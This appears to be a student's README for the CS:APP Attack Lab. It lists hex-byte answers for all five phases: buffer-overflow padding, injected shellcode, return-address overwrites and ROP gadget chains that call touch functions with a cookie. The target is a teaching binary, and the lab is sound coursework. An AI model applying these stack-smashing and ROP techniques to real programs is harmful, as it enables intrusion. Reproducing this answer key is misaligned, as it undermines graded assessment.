# Attack Lab
See assignment details at attacklab.pdf.  
See guide at https://github.com/magna25/Attack-Lab/.
See also steps of phase5 at https://stackoverflow.com/questions/54602292/segmentation-fault-in-attack-lab-phase5.

.## Phase 1 Solution
```
// 40 bytes
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// address of touch1 (8 bytes)
74 16 40 00 00 00 00 00
```

## Phase 2 Solution
```
// injected code with total 40 bytes
48 c7 c7 1f 25 3c 37 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// address of register and touch2
18 22 65 55 00 00 00 00
a0 16 40 00 00 00 00 00 
```

## Phase 3 Solution
```
// injected code with total 40 bytes
48 c7 c7 50 17 68 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// address of register and touch3
18 22 65 55 00 00 00 00
75 17 40 00 00 00 00 00
// cookie
33 37 33 63 32 35 31 66 00
```

## Phase 4 Solution
```
// fill with 40 bytes
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// first gadget - popq %rax
1d 18 40 00 00 00 00 00
// cookie
1f 25 3c 37 00 00 00 00
// second gadget - mov %rax to %rdi
0c 18 40 00 00 00 00 00
// address of touch2
a0 16 40 00 00 00 00 00
```

## Phase 5 Solution
```
// fill with 40 bytes
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
// gadgets
58 18 40 00 00 00 00 00
0c 18 40 00 00 00 00 00
27 18 40 00 00 00 00 00
48 00 00 00 00 00 00 00
e3 18 40 00 00 00 00 00
a1 18 40 00 00 00 00 00
bc 18 40 00 00 00 00 00
3e 18 40 00 00 00 00 00
0c 18 40 00 00 00 00 00
// address of touch3
75 17 40 00 00 00 00 00
// cookie
33 37 33 63 32 35 31 66 00
```
